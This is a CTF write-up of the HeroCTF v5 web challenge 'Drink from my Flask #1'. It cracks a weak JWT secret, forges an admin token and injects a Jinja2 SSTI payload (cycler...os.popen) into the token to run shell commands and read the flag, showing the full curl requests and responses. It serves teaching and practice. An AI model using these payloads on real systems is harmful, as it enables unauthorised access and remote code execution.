---
title: "[Easy][HeroCTF v5][Web] Drink from my Flask #1"
date: "2023-14-13"
categories: [ "CTF", "HeroCTF v5", "Web" ]
tags: [ "JWT", "Weak Secret", "SSTI", "RCE" ]
slug: "drink-from-my-flask-1"
ShowToc: false
draft: false
weight: 3
---

## Introduction

One of your friends had an argument with a Flask developer. He tried to handle it on his own, but he ended up hitting a roadblock... Can you put your hacking skills to use and help him out?

You should probably be able to access the server hosting your target's latest project, right? I heard they make a lot of programming mistakes...

## Solution

When we launch the challenge, we arrive at an error page that says:

```bash
curl 'http://dyn-06.heroctf.fr:13825/' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET / HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:02:58 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 70
< Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww; Path=/
< Connection: close
<
* Closing connection 0
<h2>Invalid operation</h2><br><p>Example: /?op=substract&n1=5&n2=2</p>
```

On this request, we can see several things:

- The server is using `Werkzeug 2.3.4` and `Python 3.10.6`.
- A cookie `token` is set with the value `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww`.
- The server tells us that we can perform operations with the `op`, `n1`, and `n2` parameters.

### First Lead: Werkzeug

Out of curiosity, let's check if the debug console of `Werkzeug` is enabled.

If it is enabled, then the `/console` endpoint will be accessible, and we might potentially be able to execute Python code.

```bash
curl 'http://dyn-06.heroctf.fr:13825/console' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET /console HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 404 NOT FOUND
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:06:20 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 84
< Connection: close
<
* Closing connection 0
<h2>/console was not found</h2><br><p>Only routes / and /adminPage are available</p>
```

We can see that the endpoint is not available, but we can see that the `/adminPage` endpoint is accessible.

```bash
curl 'http://dyn-06.heroctf.fr:13825/adminPage' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET /adminPage HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 403 FORBIDDEN
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:06:49 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 22
< Connection: close
<
* Closing connection 0
<h2>Invalid token</h2>
```

We can access the endpoint, but we get a `403 FORBIDDEN` error with the message `Invalid token`.

This means that the `token` cookie used for authentication is invalid.

### Second Lead: Session Token

To proceed, let's examine the content of the `token` cookie to see what type of token is being used.

At first glance, the token format resembles a session token, such as a JSON Web Token (JWT), as it consists of 3 parts encoded in base64 and separated by `.`.

To verify, let's use the website [jwt.io](https://jwt.io/) to decode the token.

![jwt.io](/images/heroctfv5/web/flask_jwt_initial.png)

The content of the JWT is:

```json
{
    "role": "guest"
}
```

The JWT header is:

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

My first thought was to test the usual JWT attacks, such as changing the algorithm to `none`, but it didn't work.

So, I thought of another possible attack on JWTs and realized that the token could simply be signed with a weak key.

To test this hypothesis, I used the tool [jwt-cracker](https://github.com/lmammino/jwt-cracker), which you can install with `npm install --global jwt-cracker`.

```bash
C:\>jwt-cracker -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww
SECRET FOUND: key
Time taken (sec): 0.888
Attempts: 100000
```

Indeed, the key used to sign the JWT is `key`.

With this secret, we can sign our own JWT with the role `admin` and inject it into the `token` cookie.

![JWT Admin](/images/heroctfv5/web/flask_jwt_admin.png)

```bash
curl 'http://dyn-06.heroctf.fr:13825/adminPage' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET /adminPage HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
> Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY
>
< HTTP/1.1 200 OK
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:17:30 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 15
< Connection: close
<
* Closing connection 0
Welcome admin !
```

Yay! We are logged in as admin!

But... we don't have the flag...

### Third Lead: Injection / RCE

Since we don't have much information about the challenge and the console is disabled, we can assume that there is some kind of injection vulnerability.

The only moment in the challenge where I saw user input reflected in the server response is when accessing the `/adminPage` endpoint with a valid identifier (`Welcome admin!`) or an invalid one (`Invalid token`).

I thought, maybe the server-side control is a simple comparison like this:

```python
if role === "key":
    return "Invalid token"
else:
    return "Welcome " + role + "!"
```

If that's the case, we can use an injection to execute arbitrary code.

To test this hypothesis, I used the following payload:

```bash
{
    "role": "{{config}}"
}
```

![JWT Config](/images/heroctfv5/web/flask_jwt_config.png)

```bash
curl 'http://dyn-06.heroctf.fr:13825/adminPage' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjb25maWd9fSJ9.Jwj89LzEaeWS3JpNQd62PMq9piL4RspA1ixc3Rpgkv8' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET /adminPage HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
> Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjb25maWd9fSJ9.Jwj89LzEaeWS3JpNQd62PMq9piL4RspA1ixc3Rpgkv8
>
< HTTP/1.1 403 FORBIDDEN
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:23:37 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 1145
< Connection: close
<
Sorry but you can't access this page, you're a '&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: None, &#39;JSON_SORT_KEYS&#39;: None, &#39;JSONIFY_PRETTYPRINT_REGULAR&#* Closing connection 0
39;: None, &#39;JSONIFY_MIMETYPE&#39;: None, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;'
```

The injection works, so we can execute arbitrary code and try to retrieve the flag.

### Retrieving the Flag

By exploring a bit of [SSTI Python on Hacktrickz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python), I found a payload that allows executing an RCE that is not dependent on the version of `__builtins__`:

```bash
{
    "role": "{{ cycler.__init__.__globals__.os.popen('ls').read() }}"
}
```

![JWT RCE](/images/heroctfv5/web/flask_jwt_ls.png)

```bash
curl 'http://dyn-06.heroctf.fr:13825/adminPage' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3sgY3ljbGVyLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCdscycpLnJlYWQoKSB9fSJ9.W716rVf0D1fAibR2HP0_7cGFxYhz0EL8hFKe1i58JQs' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET /adminPage HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
> Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3sgY3ljbGVyLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCdscycpLnJlYWQoKSB9fSJ9.W716rVf0D1fAibR2HP0_7cGFxYhz0EL8hFKe1i58JQs
>
< HTTP/1.1 403 FORBIDDEN
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:27:41 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 65
< Connection: close
<
Sorry but you can't access this page, you're a 'app.py
flag.txt
* Closing connection 0
'
```

There are two files in the current directory, `app.py` and `flag.txt`. So, we can retrieve the flag using the following payload:

```bash
{
    "role": "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
}
```

![JWT RCE](/images/heroctfv5/web/flask_jwt_flag.png)

```bash
curl 'http://dyn-06.heroctf.fr:13825/adminPage' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3sgY3ljbGVyLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCdjYXQgZmxhZy50eHQnKS5yZWFkKCkgfX0ifQ.JCGzVe2xKCMFHGGKFqCbqTDkBTfZto-0nGIY_T5IuV8' -v
*   Trying 139.162.183.244:13825...
* Connected to dyn-06.heroctf.fr (139.162.183.244) port 13825 (#0)
> GET /adminPage HTTP/1.1
> Host: dyn-06.heroctf.fr:13825
> User-Agent: curl/7.88.1
> Accept: */*
> Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3sgY3ljbGVyLl9faW5pdF9fLl9fZ2xvYmFsc19fLm9zLnBvcGVuKCdjYXQgZmxhZy50eHQnKS5yZWFkKCkgfX0ifQ.JCGzVe2xKCMFHGGKFqCbqTDkBTfZto-0nGIY_T5IuV8
>
< HTTP/1.1 403 FORBIDDEN
< Server: Werkzeug/2.3.4 Python/3.10.6
< Date: Sun, 14 May 2023 01:29:04 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 77
< Connection: close
<
Sorry but you can't access this page, you're a 'Hero{sst1_fl4v0ur3d_c0Ok1e}
* Closing connection 0
'
```

Flag: `Hero{sst1_fl4v0ur3d_c0Ok1e}`

## Tips & Tricks

- Always check error pages, as they sometimes share valuable information.
- In a Python application, always try SSTI (Server-Side Template Injection) on fields returned by the server.
- Always check the HTTP response headers.
- In a Flask application, session tokens can be cracked, and they are not always Flask tokens (like in this case, a JWT).
- Running `jwt-cracker` on a JWT token can be very useful at the beginning of a CTF (Capture The Flag) if there is a weak secret.
- Try template injections in JWTs, as sometimes they can lead to SSTI (Server-Side Template Injection).